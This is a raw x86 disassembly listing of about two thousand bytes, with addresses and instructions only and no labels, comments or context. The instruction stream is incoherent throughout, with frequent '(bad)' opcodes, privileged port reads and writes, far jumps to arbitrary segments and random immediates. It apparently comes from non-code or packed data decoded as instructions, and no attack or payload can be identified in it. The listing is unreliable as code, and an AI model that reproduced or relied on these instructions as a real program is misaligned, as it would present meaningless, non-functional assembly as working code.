  4a62ec:	loop   0x4a6304
  4a62ee:	jmp    0x5744:0x37869633
  4a62f5:	pop    edi
  4a62f6:	xor    edx,eax
  4a62f8:	shr    BYTE PTR [ecx],cl
  4a62fa:	jb     0x4a629d
  4a62fc:	lds    ebx,FWORD PTR [edx-0x40]
  4a62ff:	aaa    
  4a6300:	push   eax
  4a6301:	mul    DWORD PTR [ebx]
  4a6303:	test   BYTE PTR [ecx],al
  4a6305:	add    DWORD PTR [edx-0x23],0x17
  4a6309:	or     eax,0xf4568438
  4a630e:	xchg   DWORD PTR [eax],eax
  4a6310:	lods   eax,DWORD PTR ds:[esi]
  4a6311:	xchg   edx,eax
  4a6312:	(bad)  
  4a6313:	push   ebp
  4a6314:	mov    ah,0xbd
  4a6316:	xor    BYTE PTR [ecx+0x1752750d],ah
  4a631c:	xor    al,cl
  4a631e:	cmp    dl,BYTE PTR [edx+0x5d8d47ab]
  4a6324:	mov    ds:0x917b4bd6,al
  4a6329:	or     eax,0x80f834c
  4a632e:	daa    
  4a632f:	sbb    DWORD PTR [esi-0x3fa25920],ebp
  4a6335:	das    
  4a6336:	inc    esp
  4a6337:	pop    edx
  4a6338:	add    DWORD PTR [edi],esi
  4a633a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a633b:	xchg   dh,bl
  4a633d:	daa    
  4a633e:	jbe    0x4a638b
  4a6340:	mov    al,0x15
  4a6342:	cs sti 
  4a6344:	mov    bh,0x21
  4a6346:	mov    dh,0xdf
  4a6348:	cmp    BYTE PTR ds:0x4510b11,ah
  4a634e:	je     0x4a637b
  4a6350:	sbb    esp,ebp
  4a6352:	mov    ch,BYTE PTR [eax+eiz*1+0x67]
  4a6356:	sbb    BYTE PTR ds:0x81b225f0,ah
  4a635c:	dec    ebx
  4a635d:	push   ebp
  4a635e:	add    DWORD PTR [ecx-0x11],edi
  4a6361:	in     al,dx
  4a6362:	and    eax,0x1932c828
  4a6367:	jmp    FWORD PTR [eax-0x3e]
  4a636a:	xchg   BYTE PTR [esi],al
  4a636c:	xchg   ebx,eax
  4a636d:	daa    
  4a636e:	mov    bh,0x93
  4a6370:	out    0x73,eax
  4a6372:	mov    eax,0xb1620fa6
  4a6377:	rcl    DWORD PTR [eax],1
  4a6379:	push   ebx
  4a637a:	cmp    dl,BYTE PTR [edi-0x52d0aff6]
  4a6380:	cwde   
  4a6381:	rol    BYTE PTR [eax],cl
  4a6383:	fwait
  4a6384:	pop    edi
  4a6385:	add    BYTE PTR [ebx+0x6a7982d5],al
  4a638b:	jle    0x4a6392
  4a638d:	ffree  st(3)
  4a638f:	sub    al,0x89
  4a6391:	fidiv  DWORD PTR [eax]
  4a6393:	inc    esp
  4a6394:	call   0x4b39dbb4
  4a6399:	dec    esi
  4a639a:	add    edx,DWORD PTR [ecx+ebx*4]
  4a639d:	adc    DWORD PTR [ecx+0x790e9901],eax
  4a63a3:	das    
  4a63a4:	and    DWORD PTR [ebx+0xb36f400],esp
  4a63aa:	add    al,0xb5
  4a63ac:	dec    edx
  4a63ad:	or     ecx,DWORD PTR [eax]
  4a63af:	dec    eax
  4a63b0:	out    dx,al
  4a63b1:	dec    eax
  4a63b2:	push   edx
  4a63b3:	data16 and BYTE PTR [eax-0x20],0x73
  4a63b8:	aaa    
  4a63b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a63ba:	add    al,0x73
  4a63bc:	and    esp,ebp
  4a63be:	fld    DWORD PTR [edi-0x3d]
  4a63c1:	ret    
  4a63c2:	lods   al,BYTE PTR ds:[esi]
  4a63c3:	arpl   si,ax
  4a63c5:	leave  
  4a63c6:	and    eax,0xd1355480
  4a63cb:	add    DWORD PTR [eax-0x2dcc091f],edi
  4a63d1:	aad    0x9
  4a63d3:	jl     0x4a63dd
  4a63d5:	jg     0x4a63f8
  4a63d7:	xor    dl,bl
  4a63d9:	in     al,0x43
  4a63db:	push   ecx
  4a63dc:	adc    al,0x24
  4a63de:	mov    cl,0xef
  4a63e0:	loopne 0x4a640b
  4a63e2:	dec    esp
  4a63e3:	cwde   
  4a63e4:	arpl   WORD PTR [edx],sp
  4a63e6:	xor    DWORD PTR [esi+0x26],ebp
  4a63e9:	push   es
  4a63ea:	and    ah,0x76
  4a63ed:	repnz cmp al,0x3a
  4a63f0:	int    0x31
  4a63f2:	setae  BYTE PTR [edi]
  4a63f5:	unpcklps xmm4,xmm7
  4a63f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a63f9:	jae    0x4a6406
  4a63fb:	ja     0x4a643e
  4a63fd:	jmp    0x3199:0x45ab695e
  4a6404:	out    0x10,eax
  4a6406:	or     BYTE PTR ds:0x1064c19,dh
  4a640c:	stc    
  4a640d:	jbe    0x4a639c
  4a640f:	add    eax,0x46a098ad
  4a6414:	add    bh,BYTE PTR [edi]
  4a6416:	mov    ecx,DWORD PTR [ebp-0x3e4e8425]
  4a641c:	bound  ebp,QWORD PTR [ebx+0x258a1c3b]
  4a6422:	pop    es
  4a6423:	popf   
  4a6424:	fmul   QWORD PTR [esi-0x62]
  4a6427:	aaa    
  4a6428:	push   esi
  4a6429:	sbb    al,0xf
  4a642b:	cs inc ebp
  4a642d:	fiadd  DWORD PTR [ecx+0x4d06e75d]
  4a6433:	mov    edx,DWORD PTR ds:0xcc13b108
  4a6439:	test   DWORD PTR [ebx-0x565ac432],ecx
  4a643f:	xchg   esi,eax
  4a6440:	dec    ebx
  4a6441:	retf   
  4a6442:	dec    eax
  4a6443:	jae    0x4a642e
  4a6445:	add    BYTE PTR [edx-0x8c440a6],bh
  4a644b:	jbe    0x4a644f
  4a644d:	mov    esi,edi
  4a644f:	pop    eax
  4a6450:	add    ecx,DWORD PTR [ebx+0x7da940d6]
  4a6456:	push   cs
  4a6457:	pop    ecx
  4a6458:	js     0x4a6460
  4a645a:	jne    0x4a6467
  4a645c:	sub    al,0x73
  4a645e:	xor    BYTE PTR [esi+ebx*2-0x28],al
  4a6462:	xchg   ebx,eax
  4a6463:	xor    eax,0xef9e519f
  4a6468:	adc    al,0x22
  4a646a:	ret    
  4a646b:	jne    0x4a6485
  4a646d:	adc    esi,DWORD PTR [edi+0xe]
  4a6470:	nop
  4a6471:	enter  0x5d19,0x55
  4a6475:	std    
  4a6476:	lds    ebx,FWORD PTR [ebx]
  4a6478:	out    0xf7,eax
  4a647a:	je     0x4a642b
  4a647c:	cdq    
  4a647d:	push   edx
  4a647e:	xor    edi,DWORD PTR [edx+0x22041216]
  4a6484:	add    ah,BYTE PTR [ebp-0x46]
  4a6487:	xor    al,BYTE PTR [eax+0x151be50c]
  4a648d:	adc    al,0x71
  4a648f:	mov    al,0x57
  4a6491:	mov    DWORD PTR gs:[edi+0x14d580a6],edi
  4a6498:	add    al,0x6d
  4a649a:	mov    eax,0xd5ca4880
  4a649f:	outs   dx,BYTE PTR ds:[esi]
  4a64a0:	push   ebx
  4a64a1:	inc    ecx
  4a64a2:	cs or  al,0x83
  4a64a5:	jo     0x4a64c7
  4a64a7:	adc    bl,bh
  4a64a9:	shr    eax,1
  4a64ab:	xchg   esp,eax
  4a64ac:	jbe    0x4a6431
  4a64ae:	add    BYTE PTR [ecx+edx*2],ch
  4a64b1:	push   edx
  4a64b2:	sub    al,0x30
  4a64b4:	int    0xdc
  4a64b6:	fidiv  DWORD PTR [edi]
  4a64b8:	ss mov ah,0xc4
  4a64bb:	add    BYTE PTR [esp+esi*1+0x5b384e50],0x80
  4a64c3:	push   edx
  4a64c4:	jne    0x4a6525
  4a64c6:	mov    al,ds:0x9818341
  4a64cb:	or     al,0x8f
  4a64cd:	push   eax
  4a64ce:	and    DWORD PTR [ebp+eiz*1-0x73],ebx
  4a64d2:	adc    BYTE PTR [esi-0x713d1a54],0x44
  4a64d9:	stos   BYTE PTR es:[edi],al
  4a64da:	movshdup xmm1,XMMWORD PTR [ebp+0x2a]
  4a64df:	jp     0x4a64f1
  4a64e1:	dec    esi
  4a64e2:	aaa    
  4a64e3:	mov    esp,0x63a43b68
  4a64e8:	fwait
  4a64e9:	push   0x39ec379e
  4a64ee:	sbb    eax,0xb68c7ee5
  4a64f3:	clc    
  4a64f4:	xor    DWORD PTR [esi+0x43],edx
  4a64f7:	cld    
  4a64f8:	fdiv   QWORD PTR [edx]
  4a64fa:	aam    0xc4
  4a64fc:	or     al,BYTE PTR [eax+ebx*1]
  4a64ff:	ins    BYTE PTR es:[edi],dx
  4a6500:	xchg   BYTE PTR [edx+0x1a73090e],dl
  4a6506:	push   ebx
  4a6507:	push   ecx
  4a6508:	inc    edx
  4a6509:	inc    esi
  4a650a:	mov    ds:0x20e2078d,al
  4a650f:	jno    0x4a64f3
  4a6511:	push   cs
  4a6512:	sbb    al,BYTE PTR [edi+0x60c8ba9]
  4a6518:	and    al,cl
  4a651a:	cmp    DWORD PTR [ecx+0x6ab5ccdd],esp
  4a6520:	aaa    
  4a6521:	dec    esi
  4a6522:	push   eax
  4a6523:	mov    ebp,0x1710a80d
  4a6528:	adc    al,0x71
  4a652a:	push   0x463072ad
  4a652f:	and    DWORD PTR ds:0x5a1f228d,esp
  4a6535:	xchg   ebp,eax
  4a6536:	test   al,0xc1
  4a6538:	in     al,dx
  4a6539:	add    DWORD PTR [esi+0x50],edx
  4a653c:	mov    cl,0x6
  4a653e:	fisubr DWORD PTR [ecx+0x283d9b13]
  4a6544:	imul   esp,DWORD PTR [edx],0x9b1a921d
  4a654a:	sbb    ah,dh
  4a654c:	imul   edx,DWORD PTR [edx-0x5a],0x26cd2e02
  4a6553:	xor    al,0x47
  4a6555:	fidivr DWORD PTR ds:0xda41c0d5
  4a655b:	mov    ds:0x96aa48af,eax
  4a6560:	adc    al,0xa
  4a6562:	push   eax
  4a6563:	sti    
  4a6564:	dec    BYTE PTR [ecx+ecx*1]
  4a6567:	jbe    0x4a6525
  4a6569:	les    eax,FWORD PTR [edx-0x7f4f9780]
  4a656f:	mov    es,edx
  4a6571:	fwait
  4a6572:	dec    ebp
  4a6573:	neg    DWORD PTR [ecx+0xc84955c]
  4a6579:	or     DWORD PTR [esi-0x7c],ebx
  4a657c:	xchg   bh,dl
  4a657e:	add    eax,0x8f500761
  4a6583:	sahf   
  4a6584:	push   esp
  4a6585:	std    
  4a6586:	add    al,0x87
  4a6588:	or     bl,BYTE PTR [edx]
  4a658a:	or     BYTE PTR [edi+eiz*2-0x7f049f54],bl
  4a6591:	(bad)  
  4a6592:	sub    ebp,esp
  4a6594:	sbb    ah,BYTE PTR [ecx]
  4a6596:	pop    es
  4a6597:	bound  edx,QWORD PTR [esi-0x16]
  4a659a:	adc    al,0x21
  4a659c:	inc    ebx
  4a659d:	add    eax,0xe951b247
  4a65a2:	adc    al,0x39
  4a65a4:	in     al,0xc8
  4a65a6:	xor    edx,DWORD PTR [eax+ebx*1]
  4a65a9:	push   esi
  4a65aa:	push   edx
  4a65ab:	inc    esi
  4a65ac:	inc    edx
  4a65ad:	xchg   BYTE PTR [edx-0x18aec3c9],al
  4a65b3:	stos   DWORD PTR es:[edi],eax
  4a65b4:	repnz sbb al,0x49
  4a65b7:	add    al,BYTE PTR gs:[eax-0x66]
  4a65bb:	xchg   esi,eax
  4a65bc:	clc    
  4a65bd:	es pop ss
  4a65bf:	xor    dl,BYTE PTR [esp+edx*1]
  4a65c2:	mov    ebp,0x51d51f85
  4a65c7:	pusha  
  4a65c8:	add    al,0xe9
  4a65ca:	adc    al,0x51
  4a65cc:	inc    esi
  4a65cd:	sbb    al,0x50
  4a65cf:	in     al,dx
  4a65d0:	iret   
  4a65d1:	and    BYTE PTR [edx+0x69],bh
  4a65d4:	pusha  
  4a65d5:	jo     0x4a65e8
  4a65d7:	add    esi,0x14
  4a65da:	lea    edx,[edi-0x627cfe3a]
  4a65e0:	sub    DWORD PTR [eax-0x5216babd],ecx
  4a65e6:	inc    esp
  4a65e7:	pop    esp
  4a65e8:	rcl    bl,0x48
  4a65eb:	or     al,0xe0
  4a65ed:	add    DWORD PTR ds:0x1141233,ebp
  4a65f3:	fld    QWORD PTR [eax]
  4a65f5:	das    
  4a65f6:	jb     0x4a6623
  4a65f8:	mov    dl,0x6d
  4a65fa:	adc    al,0x7e
  4a65fc:	sbb    DWORD PTR [edx],ebp
  4a65fe:	lea    esi,[ecx+0x66]
  4a6601:	push   edi
  4a6602:	push   ebx
  4a6603:	mov    ch,0x45
  4a6605:	mov    edx,0x95b85e08
  4a660a:	push   esi
  4a660b:	shl    DWORD PTR [eax+0x5e3cc46d],cl
  4a6611:	pop    edi
  4a6612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a6613:	or     al,0xc2
  4a6615:	mov    ebp,0x1be9d571
  4a661a:	lea    ecx,[eax+0x56]
  4a661d:	lea    edx,[eax+0x1c]
  4a6620:	sub    eax,0x102a023
  4a6625:	test   al,0x4b
  4a6627:	daa    
  4a6628:	mov    DWORD PTR [esi],esp
  4a662a:	or     al,0x46
  4a662c:	pop    esp
  4a662d:	sub    eax,0x9b656ced
  4a6632:	dec    esi
  4a6633:	push   ss
  4a6634:	pop    esi
  4a6635:	adc    al,0x28
  4a6637:	dec    ebx
  4a6638:	fld    QWORD PTR [ebp+0x768d6ac4]
  4a663e:	dec    ax
  4a6640:	es pop ds
  4a6642:	and    al,0x3e
  4a6644:	and    ah,0x79
  4a6647:	sahf   
  4a6648:	mov    ebp,DWORD PTR [ebx+0x10]
  4a664b:	adc    al,0x8
  4a664d:	or     al,0x13
  4a664f:	adc    BYTE PTR [edx+0x26af527],dl
  4a6655:	cmp    eax,0x68093a74
  4a665a:	das    
  4a665b:	inc    edi
  4a665c:	and    dl,cl
  4a665e:	mov    WORD PTR [edx+edx*1+0x76],fs
  4a6662:	pop    ss
  4a6663:	ins    BYTE PTR es:[edi],dx
  4a6664:	mov    ?,WORD PTR ds:0x22b465ef
  4a666a:	and    al,0x24
  4a666c:	sbb    DWORD PTR [eax],ecx
  4a666e:	aad    0x15
  4a6670:	xchg   edi,eax
  4a6671:	xor    al,0xa7
  4a6673:	out    dx,eax
  4a6674:	push   edi
  4a6675:	fld    QWORD PTR [ebx]
  4a6677:	and    ecx,DWORD PTR [ebx]
  4a6679:	(bad)  
  4a667a:	in     eax,dx
  4a667b:	test   cl,al
  4a667d:	push   es
  4a667e:	push   cs
  4a667f:	test   eax,0x58c74cb4
  4a6684:	adc    al,0x14
  4a6686:	sbb    BYTE PTR [edx+ebp*1-0x79],cl
  4a668a:	push   esp
  4a668b:	sbb    BYTE PTR [esp+ebx*1],bl
  4a668e:	push   eax
  4a668f:	mov    edx,0x484c3560
  4a6694:	sbb    DWORD PTR [edx-0xc],0x30
  4a6698:	xor    al,0x32
  4a669a:	popf   
  4a669b:	mov    esp,0x2be80f0
  4a66a0:	add    al,0x45
  4a66a2:	pop    ds
  4a66a3:	loopne 0x4a66a5
  4a66a5:	xchg   esp,eax
  4a66a6:	sahf   
  4a66a7:	in     eax,0x56
  4a66a9:	adc    ah,BYTE PTR [edi+0x63]
  4a66ac:	mov    edi,0x682e2d24
  4a66b1:	test   al,0x29
  4a66b3:	and    ebx,DWORD PTR [ecx*4-0x129cadfe]
  4a66ba:	inc    edi
  4a66bb:	xor    BYTE PTR [eax+0x21],dl
  4a66be:	mov    esp,0x78446000
  4a66c3:	std    
  4a66c4:	mov    ch,0x8e
  4a66c6:	and    esp,DWORD PTR [eax+0x2e576b56]
  4a66cc:	push   0xffffffcd
  4a66ce:	dec    eax
  4a66cf:	pop    ss
  4a66d0:	mov    al,ds:0x185d4938
  4a66d5:	adc    bl,ah
  4a66d7:	loop   0x4a6739
  4a66d9:	fcmovnbe st,st(4)
  4a66db:	sub    eax,0x524b542a
  4a66e0:	bound  edx,QWORD PTR [edi-0x1b]
  4a66e3:	outs   dx,DWORD PTR ds:[esi]
  4a66e4:	inc    ecx
  4a66e5:	xchg   BYTE PTR [eax],bl
  4a66e7:	sub    ebx,esi
  4a66e9:	adc    dh,BYTE PTR [eax]
  4a66eb:	add    edx,DWORD PTR [esp+edx*1+0x59]
  4a66ef:	data16 adc BYTE PTR [edi],0x84
  4a66f3:	push   ds
  4a66f4:	push   esp
  4a66f5:	aam    0x42
  4a66f7:	add    bh,BYTE PTR [ebp-0x3f2bfb17]
  4a66fd:	lock xor eax,0x94cdfea
  4a6703:	fcom   DWORD PTR [esi-0x73]
  4a6706:	jo     0x4a6704
  4a6708:	push   0x564437b5
  4a670d:	ror    DWORD PTR [ebx+0x75],0x24
  4a6711:	and    BYTE PTR [esp+edi*8+0x1c],ah
  4a6715:	fistp  WORD PTR [esi]
  4a6717:	xchg   edi,eax
  4a6718:	pop    es
  4a6719:	sbb    BYTE PTR ds:0x3c630904,0xc3
  4a6720:	sbb    edx,eax
  4a6722:	daa    
  4a6723:	mov    ecx,0x1c1edaca
  4a6728:	test   DWORD PTR [edx+0x15ec6d8a],eax
  4a672e:	and    DWORD PTR [eax+0x21],ebp
  4a6731:	mov    dh,0x31
  4a6733:	or     bh,ch
  4a6735:	inc    esp
  4a6736:	adc    BYTE PTR ds:0x21902b8c,bh
  4a673c:	dec    esp
  4a673d:	repnz sub eax,0x4ef4699
  4a6743:	and    eax,DWORD PTR [ebx]
  4a6745:	dec    eax
  4a6746:	jb     0x4a676c
  4a6748:	inc    edi
  4a6749:	add    al,BYTE PTR [ecx]
  4a674b:	inc    ecx
  4a674c:	jl     0x4a675c
  4a674e:	add    edi,ecx
  4a6750:	add    bh,dh
  4a6752:	data16 test BYTE PTR [ebx+ebx*1],dh
  4a6756:	rcl    BYTE PTR [ebx],0x29
  4a6759:	sbb    eax,0xe94cdac3
  4a675e:	inc    eax
  4a675f:	add    al,0x47
  4a6761:	sbb    dh,BYTE PTR [eax-0x602ce9fc]
  4a6767:	pop    es
  4a6768:	sub    BYTE PTR [edx+eiz*1],al
  4a676b:	mov    edi,0x2438d384
  4a6770:	or     DWORD PTR [edx+0x1e],esi
  4a6773:	add    al,0x32
  4a6775:	rcl    BYTE PTR [edx+0x46],0x7f
  4a6779:	mov    ds:0xffa9d099,eax
  4a677e:	sbb    DWORD PTR [eax-0x29eea0e4],edx
  4a6784:	sbb    al,0x9
  4a6786:	retf   
  4a6787:	jl     0x4a67cc
  4a6789:	xor    DWORD PTR [eax],esp
  4a678b:	jmp    0xe948ed9d
  4a6790:	push   0x64f17e28
  4a6795:	add    ah,bh
  4a6797:	jmp    0x4a67c7
  4a6799:	mov    ah,0xfd
  4a679b:	(bad)  
  4a679c:	cmp    DWORD PTR [edx],ebp
  4a679e:	adc    eax,0x531a8c6c
  4a67a3:	je     0x4a67ad
  4a67a5:	push   ds
  4a67a6:	ret    0xb558
  4a67a9:	mov    al,ds:0x243594d0
  4a67ae:	icebp  
  4a67af:	push   es
  4a67b0:	outs   dx,BYTE PTR ds:[esi]
  4a67b1:	jo     0x4a6813
  4a67b3:	mov    ?,edi
  4a67b5:	mov    ch,BYTE PTR [edi-0x22]
  4a67b8:	jno    0x4a682f
  4a67ba:	retf   
  4a67bb:	adc    BYTE PTR [bp+di-0x1d],ah
  4a67bf:	sahf   
  4a67c0:	cld    
  4a67c1:	cli    
  4a67c2:	xor    dh,BYTE PTR [eax]
  4a67c4:	push   0xba381260
  4a67c9:	cmp    eax,0x5314a001
  4a67ce:	stos   DWORD PTR es:[edi],eax
  4a67cf:	push   ecx
  4a67d0:	idiv   DWORD PTR [edx]
  4a67d2:	rol    eax,1
  4a67d4:	jb     0x4a67c1
  4a67d6:	cmp    eax,0xa987636a
  4a67db:	callw  0xc747
  4a67df:	xor    BYTE PTR [esi+ecx*1+0x50],dl
  4a67e3:	jb     0x4a685e
  4a67e5:	(bad)  
  4a67e7:	xor    al,0x2a
  4a67e9:	add    BYTE PTR [edx],dl
  4a67eb:	xor    BYTE PTR [eax],dl
  4a67ed:	sub    al,0x72
  4a67ef:	int    0x82
  4a67f1:	jnp    0x4a6796
  4a67f3:	sub    BYTE PTR [eax],dl
  4a67f5:	push   es
  4a67f6:	adc    BYTE PTR [edx],ah
  4a67f8:	mov    eax,ds:0x3a36024f
  4a67fd:	push   edx
  4a67fe:	sbb    eax,0x77a00300
  4a6803:	mov    ecx,0xc55e5653
  4a6808:	lods   eax,DWORD PTR ds:[esi]
  4a6809:	pusha  
  4a680a:	out    dx,al
  4a680b:	sub    al,0x69
  4a680d:	mov    bh,0x3
  4a680f:	and    edx,DWORD PTR [edx-0x56ffe5d3]
  4a6815:	sbb    BYTE PTR [edi+0x213b400c],cl
  4a681b:	pop    ecx
  4a681c:	mov    DWORD PTR [ebx-0x3fea3f79],edx
  4a6822:	clc    
  4a6823:	jne    0x4a6849
  4a6825:	std    
  4a6826:	xchg   esi,eax
  4a6827:	hlt    
  4a6828:	push   ds
  4a6829:	push   0xd05156d4
  4a682e:	dec    ebx
  4a682f:	xchg   edx,eax
  4a6830:	push   cs
  4a6831:	stc    
  4a6832:	out    0x1a,eax
  4a6834:	addr16 ss jge 0x4a686b
  4a6838:	sbb    DWORD PTR [ebx],eax
  4a683a:	and    eax,0x56fc7a80
  4a683f:	adc    eax,0xa0b1801c
  4a6844:	jb     0x4a6822
  4a6846:	(bad)  
  4a6847:	sub    eax,0x4dfb1c47
  4a684c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a684d:	mov    ebx,0x8fe83f11
  4a6852:	cmp    BYTE PTR [eax+ebp*2+0x344439fb],al
  4a6859:	push   ecx
  4a685a:	mov    ds:0x5422371b,ax
  4a6860:	or     BYTE PTR [eax-0x44],0x15
  4a6864:	pop    edx
  4a6865:	inc    ecx
  4a6866:	cwde   
  4a6867:	add    ecx,edx
  4a6869:	jg     0x4a686d
  4a686b:	ret    
  4a686c:	loopne 0x4a6876
  4a686e:	push   ecx
  4a686f:	ja     0x4a6840
  4a6871:	popa   
  4a6872:	dec    edi
  4a6873:	fidivr DWORD PTR [eax-0x80]
  4a6876:	cmp    eax,0x5775f3ed
  4a687b:	rcl    BYTE PTR [edi],cl
  4a687d:	lods   al,BYTE PTR ds:[esi]
  4a687e:	inc    ebx
  4a687f:	std    
  4a6880:	mov    cl,0x4b
  4a6882:	xor    bh,al
  4a6884:	shr    ch,1
  4a6886:	add    eax,0x10514fbf
  4a688b:	pop    ecx
  4a688c:	jb     0x4a681e
  4a688e:	fcmovbe st,st(5)
  4a6890:	push   ds
  4a6891:	inc    esp
  4a6892:	mov    BYTE PTR ds:0x4253c222,dl
  4a6898:	push   edx
  4a6899:	out    0x6,al
  4a689b:	push   cs
  4a689c:	jae    0x4a6826
  4a689e:	mov    al,ds:0x7ef3da0b
  4a68a3:	pop    ebx
  4a68a4:	or     al,0x18
  4a68a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a68a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a68a8:	adc    bl,BYTE PTR [eax]
  4a68aa:	push   ebx
  4a68ab:	mov    esi,ebx
  4a68ad:	jb     0x4a68b1
  4a68af:	aad    0x43
  4a68b1:	sti    
  4a68b2:	mov    bh,BYTE PTR [edi+eiz*4]
  4a68b5:	xchg   DWORD PTR [edx],edi
  4a68b7:	mov    ds:0x52a47060,eax
  4a68bc:	mov    BYTE PTR ds:0xa7cb346,cl
  4a68c2:	sbb    BYTE PTR [eax-0x58],0x27
  4a68c6:	dec    eax
  4a68c7:	xor    ch,bl
  4a68c9:	adc    al,0x84
  4a68cb:	out    dx,eax
  4a68cc:	add    BYTE PTR [eax],al
  4a68ce:	imul   ebx,DWORD PTR ds:[esi+eiz*2-0x67009962],0x5143c924
  4a68da:	mov    ebp,cs
  4a68dc:	push   cs
  4a68dd:	add    DWORD PTR [eax],edx
  4a68df:	sbb    dl,BYTE PTR [edx-0x71]
  4a68e2:	enter  0x1c7c,0xa5
  4a68e6:	imul   ebx,DWORD PTR [edx+0x4c],0xffffff83
  4a68ea:	sahf   
  4a68eb:	jmp    0x756f:0xbf00876d
  4a68f2:	shr    DWORD PTR [edx+esi*1-0x3e],cl
  4a68f6:	or     DWORD PTR [ecx+0x4e],ecx
  4a68f9:	sar    BYTE PTR [ebx+0x20],1
  4a68fc:	adc    bl,BYTE PTR [esi+ebp*4]
  4a68ff:	mov    BYTE PTR ds:0xd7d42dee,0x94
  4a6906:	fidiv  DWORD PTR [ebx]
  4a6908:	sahf   
  4a6909:	or     eax,0x57ab4ae8
  4a690e:	mov    ah,0x11
  4a6910:	mov    eax,ds:0x2904ed41
  4a6915:	mov    al,ds:0xa12b2715
  4a691a:	or     DWORD PTR [ebx],esp
  4a691c:	pop    esi
  4a691d:	jp     0x4a698b
  4a691f:	cmp    DWORD PTR [ebx],0x77
  4a6922:	ret    
  4a6923:	cmp    eax,0x81baf578
  4a6928:	mov    eax,ds:0x959903d
  4a692d:	add    DWORD PTR [ebp+0x29c74cdd],ebp
  4a6933:	retf   
  4a6934:	adc    bl,BYTE PTR [esi+esi*2+0x1bfa624a]
  4a693b:	mov    eax,ds:0x606c2d9a
  4a6940:	fst    QWORD PTR [esi+ebp*1]
  4a6943:	push   0xfadcbe83
  4a6948:	pop    eax
  4a6949:	sbb    BYTE PTR [ebx],bh
  4a694b:	jg     0x4a699b
  4a694d:	push   0xed933d09
  4a6952:	shl    BYTE PTR [eax+ebx*8],0x28
  4a6956:	sub    eax,0x6d2574dc
  4a695b:	imul   ebx,DWORD PTR [ebp+0x9],0x24
  4a695f:	cmp    esp,edi
  4a6961:	push   edi
  4a6962:	mov    edx,DWORD PTR [eax-0x56]
  4a6965:	or     DWORD PTR [ebx+0x70244470],ecx
  4a696b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a696d:	out    dx,al
  4a696e:	sub    eax,0x52311760
  4a6973:	mov    edx,0x2d4f60ef
  4a6978:	and    eax,0xf9d801b9
  4a697d:	popa   
  4a697e:	mov    ecx,DWORD PTR [esi]
  4a6980:	enter  0x3b8c,0x74
  4a6984:	mov    dl,0xfc
  4a6986:	mov    esp,0xcd3a1984
  4a698b:	sub    eax,0x3edf187b
  4a6990:	pop    edx
  4a6991:	fcomp  DWORD PTR [eax+0x40]
  4a6994:	jno    0x4a691a
  4a6996:	inc    ecx
  4a6997:	cdq    
  4a6998:	fwait
  4a6999:	push   ss
  4a699a:	push   ds
  4a699b:	sbb    dl,BYTE PTR [edi]
  4a699d:	ss xchg edi,eax
  4a699f:	and    DWORD PTR [ebx+ebp*1-0x60dd27ae],0x61c3d4d0
  4a69aa:	mov    dl,0x7b
  4a69ac:	stos   BYTE PTR es:[edi],al
  4a69ad:	add    esp,DWORD PTR [ecx-0x6b]
  4a69b0:	fbld   TBYTE PTR [ebp-0x20]
  4a69b3:	jne    0x4a6a06
  4a69b5:	xor    eax,edx
  4a69b7:	(bad)  
  4a69b8:	pop    ebp
  4a69b9:	sbb    al,0xd2
  4a69bb:	stos   DWORD PTR es:[edi],eax
  4a69bc:	add    DWORD PTR [edi+0x61],eax
  4a69bf:	leave  
  4a69c0:	je     0x4a69e0
  4a69c2:	mov    ah,0x5c
  4a69c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a69c5:	shl    DWORD PTR [ecx-0x134789f1],cl
  4a69cb:	inc    eax
  4a69cc:	div    BYTE PTR ss:[ebx+0x6e2d9a2d]
  4a69d3:	cdq    
  4a69d4:	add    DWORD PTR [ecx-0x32],eax
  4a69d7:	pop    ds
  4a69d8:	fcom   QWORD PTR cs:[ebx]
  4a69db:	or     esi,esi
  4a69dd:	or     BYTE PTR [eax],al
  4a69df:	sub    eax,0xa6145ea5
  4a69e4:	mov    BYTE PTR [edx+eax*1-0x3e],dh
  4a69e8:	jle    0x4a69fa
  4a69ea:	fwait
  4a69eb:	pusha  
  4a69ec:	push   0x4e4a2e11
  4a69f1:	call   0x8478c149
  4a69f6:	test   DWORD PTR [ebx+0x6f],ebx
  4a69f9:	sub    BYTE PTR [ebx],ch
  4a69fb:	pop    ebx
  4a69fc:	pop    ebx
  4a69fd:	xchg   edx,eax
  4a69fe:	add    ah,BYTE PTR [ebx+0x8255809]
  4a6a04:	stos   DWORD PTR es:[edi],eax
  4a6a05:	ja     0x4a6a14
  4a6a07:	push   eax
  4a6a08:	pop    es
  4a6a09:	hlt    
  4a6a0a:	adc    DWORD PTR [edx],ecx
  4a6a0c:	sbb    eax,edx
  4a6a0e:	cld    
  4a6a0f:	push   ecx
  4a6a10:	inc    edx
  4a6a11:	adc    BYTE PTR [esi+0x8],0x73
  4a6a15:	sbb    eax,DWORD PTR [ebx]
  4a6a17:	mov    ds:0x935e6fa6,eax
  4a6a1c:	push   esi
  4a6a1d:	sub    esp,DWORD PTR [eax-0x4b]
  4a6a20:	pop    es
  4a6a21:	ret    
  4a6a22:	aas    
  4a6a23:	adc    eax,0x2116a416
  4a6a28:	xor    al,0xeb
  4a6a2a:	(bad)  
  4a6a2b:	adc    eax,0x440f2a20
  4a6a30:	sub    eax,0x3800ebb0
  4a6a35:	adc    DWORD PTR ds:0xc43152e,edi
  4a6a3b:	pushf  
  4a6a3c:	xlat   BYTE PTR ds:[ebx]
  4a6a3d:	pop    ebp
  4a6a3e:	or     cl,BYTE PTR [eax]
  4a6a40:	loope  0x4a6a94
  4a6a42:	loop   0x4a69fc
  4a6a44:	loope  0x4a6a09
  4a6a46:	xor    BYTE PTR [ebp-0x32],ch
  4a6a49:	pushf  
  4a6a4a:	add    DWORD PTR [ecx],0xfffffff8
  4a6a4d:	pop    esi
  4a6a4e:	push   esi
  4a6a4f:	ja     0x4a6a14
  4a6a51:	mov    ebx,0x5e848739
  4a6a56:	sub    al,0x74
  4a6a58:	xor    ch,BYTE PTR [edi]
  4a6a5a:	inc    edx
  4a6a5b:	clc    
  4a6a5c:	inc    ecx
